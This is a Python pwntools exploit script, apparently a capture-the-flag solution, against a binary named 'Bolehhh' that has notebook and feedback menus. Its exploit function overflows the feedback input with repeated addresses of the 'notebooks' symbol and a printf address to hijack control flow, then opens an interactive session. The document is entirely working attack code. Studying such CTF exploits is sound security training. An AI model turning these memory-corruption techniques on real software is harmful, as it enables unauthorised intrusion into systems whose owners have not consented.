#!/usr/bin/python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './Bolehhh' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *addFeedback
break *0x4014ef
break *addNotebook
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

def add_notebook(idx, title, content):
    io.sendlineafter('choice: ', '1')
    io.sendlineafter('index: ', str(idx).encode())
    io.sendlineafter('title: ', str(title).encode())
    io.sendlineafter('content: ', str(content).encode())
    
def remove_notebook(idx):
    io.sendlineafter('choice: ', '2')
    io.sendlineafter('index: ', str(idx))

def add_feedback(content):
    io.sendlineafter('choice: ', '3')
    io.sendlineafter('feedback: ', content)



# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    printf = 0x4014ef
    add_notebook(0, 'A' * 4, 'B' * 4)
    payload = p64(elf.sym['notebooks']) * 9
    payload += p64(printf)
    add_feedback(payload)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()